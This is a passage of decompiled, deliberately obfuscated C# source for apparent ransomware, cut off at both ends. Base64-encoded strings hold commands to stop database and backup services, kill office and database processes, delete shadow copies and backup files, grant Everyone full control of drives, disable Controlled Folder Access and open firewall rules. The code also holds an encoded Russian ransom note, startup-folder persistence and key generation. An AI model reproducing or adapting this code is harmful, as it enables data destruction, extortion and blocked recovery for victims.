      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBzd2lfZmlsdGVyIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBzd2lfc2VydmljZSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBzd2lfdXBkYXRlIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBUbUNDU0YgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxCcm93c2VyIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCB0bWxpc3RlbiAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBUcnVlS2V5IC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBXUlNWQyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
    };
    public static List<string> lsWtVCsEzBTL = new List<string>()
    {
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
    };
    public static List<string> vptJpYJhZlMRM = new List<string>()
    {
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG1zcHViLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG15c3FsZC5leGUgL0Y="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIGFnbnRzdmMuZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHRoZWJhdC5leGUgL0Y="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHN0ZWFtLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIGVuY3N2Yy5leGUgL0Y="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIGV4Y2VsLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIENOVEFvU01nci5leGUgL0Y="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIGRiZW5nNTAuZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG9jb21tLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHpvb2x6LmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIGRic25tcC5leGUgL0Y="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG1zcHViLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG9uZW5vdGUuZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG91dGxvb2suZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHZpc2lvLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHdpbndvcmQuZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG15c3FsZC1udC5leGUgL0Y="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHdvcmRwYWQuZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG9jc3NkLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIG9yYWNsZS5leGUgL0Y="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
    };
    public static List<string> JNcObsVMzwaXqv = new List<string>()
    {
      BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.IPHxEYiEhccEgJV("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.IPHxEYiEhccEgJV("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
    };
    public static string PgMUbAxWXI = BErRpdYOfQAwSr.oMKRHTBqYRfOk("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");
    public static List<string> aNwBUUqhGtLFvJ = new List<string>()
    {
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
    };
    public static List<string> uGHBYLBfRrA = new List<string>()
    {
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
    };
    public static string RvXwlpKWgUqArdvu = "NO";
    public static string UvaPDtlsoZ = "NO";
    internal static DateTime bBscGbmILhYDut = new DateTime(2000, 1, 1);
    internal static DateTime gfeZJOxXMpBSu = new DateTime(2100, 1, 1);
    public static string YvhlPQrYyPhB = "YES";
    public static string XZspBinZvbc = "10";
    public static string kUvXzUNEQSmOgoU = "NO";
    public static string bYSDTWtBRFoMLMUw = "NO";
    public static string IUVLTrSGCNEFgir = "NO";
    public static string wZPQrpRzMll = "YES";
    public static string jcyPPQRuMNBV = "NO";
    public static string XiSfijQzOr = "NO";
    public static List<string> HLlzhaBALyehKMW = new List<string>()
    {
      "docx",
      "pdf",
      "xlsx",
      "csv"
    };
    public static string LNfftKTeaLEJxe = "NO";
    public static string jUyryfTlTABVm = "1";
    public static string jAdmyKGEsaBUh = "YES";
    public static string CKQbZpYfqsJAt = "NO";
    public static string CmNQsgAsPTLdr = "NO";
    public static string PKLvCQuQNcTS = string.Empty;
    public static string mQYKbeuyHhKQP = "NO";
    public static string ILHnWjQjfUkffJe = "YES";
    public static string EMkDRelwWGZ = "YES";
    public static string EhKqkDBbta = "0JLQvdC40LzQsNC90LjQtSDQktC90LjQvNCw0L3QuNC1INCS0L3QuNC80LDQvdC40LUhISE=";
    public static string hXdhfhCZQZwsD = "0KMg0LLQsNGBINGB0LvQvtC20L3QvtGB0YLQuCDRgSBJVCDQsdC10LfQvtC/0LDRgdC90L7RgdGC0YzRjj8NCg0K0J3QsNGI0Lgg0YHQv9C10YbQuNCw0LvQuNGB0YLRiyDQktCw0Lwg0LPQsNGA0LDQvdGC0LjRgNC+0LLQsNC90L4g0L/QvtC80L7Qs9GD0YIuDQoNCtCU0LvRjyDRjdGC0L7Qs9C+INC90LDQv9C40YjQuNGC0LUg0L3QsNC8INC90LAg0L/QvtGH0YLRgyAtIHNlY3VyaXR5ODQ5QG51a2UuYWZyaWNh";
    public static string rAOdTJDjvf = "NO";
    public static string TTjoQWzJaWoUj = "YES";
    public static string SHnoEunPucmQ = "NO";
    public static string SVkgOVyoDb = "YES";
    public static string rnQClixIasoUk = "NO";
    public static string fFemGrmzsojBt = "LOGONISOFF";
    public static string uBZpIqctGlnnN = "NO";
    public static string CpuCxDkASAKU = "YES";
    public static string SGHDaCxgQr = "mystartup.lnk";
    public static string qFDgnyGhwfm = "NO";
    public static string HkcjRmtfzgYbbl = "YES";
    public static string HbxHJoiXAuWQ = "NO";
    public static string vJXCvrLeIURfhG = "NO";
    public static string RWvNPbkGfQ = "VGhhbm9z";
    public static string XXZSvUyKJS = "YES";
    public static string NpsmwfcYiqSGR = "NO";
    public static string VbHJPaaQsEoCZHSl = "NO";
    public static string VnmuFCXwLb = "YES";
    public static string[] OlEsalIPJXyhSZEgg = new string[9]
    {
      "ragent.exe",
      "rmngr.exe",
      "rphost.exe",
      "1cv8.exe",
      "sql.exe",
      "sqld.exe",
      "mysql.exe",
      "mysqld.exe",
      "oracle.exe"
    };
    public static string KGlWteEpKYfz = "YES";
    public static bool sWEYqVGQKvAbKzrbA = true;
    public static string nsyymqqKpcXoy = "YES";
    public static bool txjxRPsHuzRR = false;
    public static bool hdKvmQeIrHY = true;
    public static bool yeDznzCWCgTL = true;
    public static bool SQFadnwkoNIbWf = true;
    public static string OpWBXzCwVRYsxq = "Debug_Log.txt";
    public static bool vQOhJPfkmenqxsh = false;
    public static bool qXKhyFzEohGXJJ = true;
    public static bool kqmFHAnOmHm = false;
    public static bool qsDIrveZaNzAq = false;
    public static bool kqkNEUMWxoNDeP = true;
    public static string MwUDomDUGsVhYA = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + BhEjWEybWo.NJvLMAETTUmhx() + ".txt";
    public static List<string> YTTlQKYVEhwWmOpJ = new List<string>();
    public static List<string> UfvFMUrtpRxlu = new List<string>();
    public static List<string> XcEEPGrLNtid = new List<string>();
    private static ThreadStart CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate11;
    private static Action<string> CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate16;
    private static Action<string> CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate17;
    private static Action<string> CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate18;
    private static Action<string> CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate19;
    private static Action<string> CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1a;
    private static Action<string> CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1b;
    private static Action<string> CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1c;
    private static ThreadStart CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate2b;

    private static void Main([In] string[] obj0)
    {
      try
      {
        if (((IEnumerable<Process>) Process.GetProcesses()).Count<Process>(new Func<Process, bool>(new BErRpdYOfQAwSr.uwwAILDuwIQs()
        {
          ZERToGKXzmayuo = Process.GetCurrentProcess().ProcessName
        }.\u003CMain\u003Eb__7)) > 1)
          return;
      }
      catch (Exception ex)
      {
      }
      try
      {
        SIWOzTgeUaCFrANst.uxYeAglHxGZeDCRK(BErRpdYOfQAwSr.qygfGaCSBKuMaYS);
      }
      catch (Exception ex)
      {
      }
      try
      {
        if (BErRpdYOfQAwSr.XXZSvUyKJS == "YES")
          new Thread(new ThreadStart(fjPoGquRHqRM.MMLhPvVoFXnmIS))
          {
            Priority = ThreadPriority.Normal,
            IsBackground = true
          }.Start();
      }
      catch
      {
      }
      if (BErRpdYOfQAwSr.ubsfdUxyfp == "YES")
        Thread.Sleep(int.Parse(BErRpdYOfQAwSr.DmygpjMfFmdLKl));
      if (BErRpdYOfQAwSr.jAdmyKGEsaBUh == "YES")
      {
        try
        {
          if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            new Thread(new ThreadStart(new BErRpdYOfQAwSr.VjMyonYihPlVlJK()
            {
              HWzAhZljHiEK = new string[4]
              {
                BErRpdYOfQAwSr.oMKRHTBqYRfOk("VGFza21ncg=="),
                BErRpdYOfQAwSr.oMKRHTBqYRfOk("dGFza21ncg=="),
                BErRpdYOfQAwSr.oMKRHTBqYRfOk("UHJvY2Vzc0hhY2tlcg=="),
                BErRpdYOfQAwSr.oMKRHTBqYRfOk("cHJvY2V4cA==")
              }
            }.\u003CMain\u003Eb__8))
            {
              IsBackground = true
            }.Start();
        }
        catch
        {
        }
        try
        {
          DTdWWHxzAiIAhv.GUEWdlPnMvlQAx(BErRpdYOfQAwSr.oMKRHTBqYRfOk("dGFza21ncg=="));
        }
        catch
        {
        }
        try
        {
          DTdWWHxzAiIAhv.GUEWdlPnMvlQAx(BErRpdYOfQAwSr.oMKRHTBqYRfOk("cHJvY2V4cA=="));
        }
        catch
        {
        }
        try
        {
          DTdWWHxzAiIAhv.GUEWdlPnMvlQAx(BErRpdYOfQAwSr.oMKRHTBqYRfOk("cHJvY2V4cDY0"));
        }
        catch
        {
        }
        try
        {
          DTdWWHxzAiIAhv.GUEWdlPnMvlQAx(BErRpdYOfQAwSr.oMKRHTBqYRfOk("UHJvY2Vzc0hhY2tlcg=="));
        }
        catch
        {
        }
        new Thread(new ThreadStart(VqpeLWAVRhnNLC.YPxFSRPJzDpLIv))
        {
          IsBackground = true
        }.Start();
      }
      if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
      {
        if (BErRpdYOfQAwSr.jcyPPQRuMNBV == "YES")
        {
          try
          {
            BErRpdYOfQAwSr.ICvwPzGGqyQhqi(BErRpdYOfQAwSr.oMKRHTBqYRfOk("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
          }
          catch
          {
          }
        }
      }
      if (BErRpdYOfQAwSr.eaZoKQQqQZielZ == "YES")
        tsUMgpGERQSp.fCjafLSvJfWq();
      try
      {
        if (BErRpdYOfQAwSr.QwQuntCagGTAD == "YES")
        {
          if (wMBwtBozwWCs.RYYrBRxnizn())
          {
            new TZgsKakdaVKQciq().gSbadMzFSeu(false);
            wMBwtBozwWCs.jmSSUKsAfvHgD();
          }
        }
      }
      catch (Exception ex)
      {
      }
      if (BErRpdYOfQAwSr.naEJQRwrPwowmubCfC == "YES" && wMBwtBozwWCs.RYYrBRxnizn())
      {
        new TZgsKakdaVKQciq().gSbadMzFSeu(false);
        new TZgsKakdaVKQciq().UYThlCsjAz();
      }
      if (BErRpdYOfQAwSr.qUnWPmXugZmhz == "YES")
        zMTntIYuuvYev.jCyJrDoNBUe();
      try
      {
        ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
        string fileName = mainModule.FileName;
        string str1 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
        string str2 = str1 + Path.GetFileName(fileName);
        if (BErRpdYOfQAwSr.LbwMCCprGBEIfG == "YES" && fileName != str2)
          new Thread(new ThreadStart(BErRpdYOfQAwSr.bzrTFBJEroUqd))
          {
            IsBackground = true,
            Priority = ThreadPriority.Normal
          }.Start();
        if (BErRpdYOfQAwSr.PZtctlGFWSPg == "YES")
        {
          if (mainModule != null)
          {
            if (fileName != str2)
            {
              try
              {
                BErRpdYOfQAwSr.kqWotmnIUhMss = BErRpdYOfQAwSr.odeHSPcZur(0, BErRpdYOfQAwSr.HDBJOODGwwozS.Count);
                System.IO.File.Copy(fileName, str1 + BErRpdYOfQAwSr.HDBJOODGwwozS[BErRpdYOfQAwSr.kqWotmnIUhMss], true);
                Process.Start(str1 + BErRpdYOfQAwSr.HDBJOODGwwozS[BErRpdYOfQAwSr.kqWotmnIUhMss]);
                BErRpdYOfQAwSr.PNdHksrWsNzLSUd();
                Process.GetCurrentProcess().Kill();
              }
              catch (Exception ex)
              {
              }
            }
          }
        }
      }
      catch (Exception ex)
      {
      }
      try
      {
        if (BErRpdYOfQAwSr.RvXwlpKWgUqArdvu == "YES")
        {
          if (DateTime.Now < BErRpdYOfQAwSr.bBscGbmILhYDut)
            return;
        }
      }
      catch
      {
      }
      try
      {
        if (BErRpdYOfQAwSr.UvaPDtlsoZ == "YES")
        {
          if (DateTime.Now > BErRpdYOfQAwSr.gfeZJOxXMpBSu)
            BErRpdYOfQAwSr.PNdHksrWsNzLSUd();
        }
      }
      catch
      {
      }
      BErRpdYOfQAwSr.aAebNXDYZjDhw();
      if (BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate11 == null)
        BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate11 = new ThreadStart(BErRpdYOfQAwSr.\u003CMain\u003Eb__9);
      new Thread(BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate11)
      {
        Priority = ThreadPriority.Normal,
        IsBackground = true
      }.Start();
      try
      {
        if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        {
          if (BErRpdYOfQAwSr.yeDznzCWCgTL)
          {
            try
            {
              new Thread(new ThreadStart(slznwupxHPlJ.VnijWvoutZnJ))
              {
                IsBackground = true
              }.Start();
            }
            catch
            {
            }
          }
        }
      }
      catch (Exception ex)
      {
      }
      if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
      {
        BErRpdYOfQAwSr.uATAppcKlZ("cmd.exe", BErRpdYOfQAwSr.oMKRHTBqYRfOk("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
        BErRpdYOfQAwSr.uATAppcKlZ("cmd.exe", BErRpdYOfQAwSr.oMKRHTBqYRfOk("L2MgcmQgL3MgL3EgRDpcXCRSZWN5Y2xlLmJpbg=="));
        BErRpdYOfQAwSr.uATAppcKlZ(BErRpdYOfQAwSr.oMKRHTBqYRfOk("bmV0c2g="), BErRpdYOfQAwSr.oMKRHTBqYRfOk("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJOZXR3b3JrIERpc2NvdmVyeVwiIG5ldyBlbmFibGU9WWVz"));
        BErRpdYOfQAwSr.uATAppcKlZ(BErRpdYOfQAwSr.oMKRHTBqYRfOk("bmV0c2g="), BErRpdYOfQAwSr.oMKRHTBqYRfOk("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9IkZpbGUgYW5kIFByaW50ZXIgU2hhcmluZyIgbmV3IGVuYWJsZT1ZZXM="));
      }
      if (BErRpdYOfQAwSr.kdbxgjgptILmf == "YES" && BErRpdYOfQAwSr.oTRBkZZrvG() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        new Thread(new ThreadStart(kRQDUzryMSl.cMlMdpeeaKGoIlR))
        {
          IsBackground = false,
          Priority = ThreadPriority.Normal
        }.Start();
      int num1 = BErRpdYOfQAwSr.MEfeXGAJzJqj == "YES" ? 1 : 0;
      SecureString secureString = new SecureString();
      if (BErRpdYOfQAwSr.kUvXzUNEQSmOgoU == "NO")
      {
        Random random = new Random();
        for (int index = 0; index < 32; ++index)
        {
          char ch = (char) (random.Next(33, (int) sbyte.MaxValue) % (int) byte.MaxValue);
          if (Convert.ToInt32(ch) == 34 || Convert.ToInt32(ch) == 92)
            --index;
          else
            secureString.AppendChar(Convert.ToChar(ch));
        }
      }
      else
        BErRpdYOfQAwSr.FYndIeNOJJCR = "O8ESC2CXZC6QQJW23RXIVQVTC6PBL9OA";
      BErRpdYOfQAwSr.nFHjUKNuaEOj = HAbvOFkMJVoSN.IOEmPutvAYpeIgr(BErRpdYOfQAwSr.DhkyAUdEoqAPuutg(secureString));
      if (BErRpdYOfQAwSr.ILHnWjQjfUkffJe == "YES")
        BErRpdYOfQAwSr.bIoyQTORDlN();
      if (BErRpdYOfQAwSr.kqmFHAnOmHm)
      {
        try
        {
          if (!System.IO.File.Exists(Path.Combine(Directory.GetCurrentDirectory(), BErRpdYOfQAwSr.MwUDomDUGsVhYA)))
